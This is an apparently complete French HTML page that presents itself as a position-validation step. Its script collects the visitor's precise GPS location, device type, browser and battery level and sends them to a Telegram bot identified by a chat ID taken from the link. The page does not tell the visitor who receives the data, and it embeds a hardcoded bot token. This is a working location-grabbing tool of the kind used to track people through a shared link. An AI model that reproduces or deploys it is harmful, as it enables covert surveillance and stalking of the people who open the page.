<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation de votre position</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 60px 20px;
            background-color: #f4f4f9;
        }
        h1 {
            color: #333;
            font-size: 22px;
        }
        p {
            color: #666;
            font-size: 16px;
            margin-top: 20px;
        }
        .loader {
            margin: 30px auto;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0088cc;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <h1>Validation en cours...</h1>
    <div class="loader"></div>
    <p>Veuillez patienter pendant la transmission des données de l'appareil.</p>

    <script>
        const BOT_TOKEN = "8805637787:AAGMIxpTUNKuIHnSRLiyYgCS980X7khKSQg";

        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id');

        // Fonction pour détecter le navigateur et l'appareil
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = "Navigateur inconnu";
            let device = "Appareil mobile / PC";

            // Détection du navigateur
            if (ua.includes("Firefox")) browser = "Mozilla Firefox";
            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
            else if (ua.includes("Trident")) browser = "Internet Explorer";
            else if (ua.includes("Edge")) browser = "Microsoft Edge";
            else if (ua.includes("Chrome")) browser = "Google Chrome";
            else if (ua.includes("Safari")) browser = "Apple Safari";

            // Détection basique de l'appareil via User-Agent
            if (/android/i.test(ua)) device = "Smartphone Android";
            else if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone / iOS";
            else if (/windows/i.test(ua)) device = "PC Windows";
            else if (/macintosh|mac os x/i.test(ua)) device = "Macintosh";

            return { browser, device };
        }

        window.onload = async function() {
            if (!chatId) {
                document.querySelector('h1').innerText = "Erreur";
                document.querySelector('p').innerText = "Identifiant de chat introuvable.";
                return;
            }

            if (!navigator.geolocation) {
                alert("La géolocalisation n'est pas supportée.");
                return;
            }

            // Récupérer le niveau de la batterie si l'API est disponible
            let batteryLevel = "Inconnu";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + "%";
                }
            } catch (e) {
                console.log("Batterie non accessible");
            }

            const info = getDeviceInfo();

            // Demande de la position GPS
            navigator.geolocation.getCurrentPosition(async (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // 1. Préparer le texte descriptif avec toutes les informations de l'appareil
                const descriptionText = 
                    `📱 **Rapport de l'appareil**\n` +
                    `• **Appareil / Modèle :** ${info.device}\n` +
                    `• **Navigateur :** ${info.browser}\n` +
                    `• **Batterie :** ${batteryLevel}\n` +
                    `• **Chat ID :** ${chatId}`;

                const textApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(descriptionText)}&parse_mode=Markdown`;
                
                // 2. Préparer l'URL pour envoyer la carte interactive
                const locationApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

                try {
                    // Envoyer d'abord le texte avec les infos
                    await fetch(textApiUrl);
                    
                    // Envoyer ensuite la mini-carte interactive
                    const response = await fetch(locationApiUrl);

                    if (response.ok) {
                        document.querySelector('h1').innerText = "Succès !";
                        document.querySelector('p').innerText = "Les informations et la position ont été envoyées sur Telegram.";
                        setTimeout(() => { window.close(); }, 3000);
                    } else {
                        document.querySelector('h1').innerText = "Erreur";
                        document.querySelector('p').innerText = "Erreur lors de l'envoi vers Telegram.";
                    }
                } catch (error) {
                    console.error("Erreur réseau :", error);
                    document.querySelector('h1').innerText = "Erreur";
                    document.querySelector('p').innerText = "Erreur de connexion réseau.";
                }

            }, (error) => {
                document.querySelector('h1').innerText = "Autorisation requise";
                document.querySelector('p').innerText = "Veuillez autoriser l'accès à la localisation pour continuer.";
            }, { 
                enableHighAccuracy: true, 
                timeout: 15000, 
                maximumAge: 0 
            });
        };
    </script>

</body>
</html>
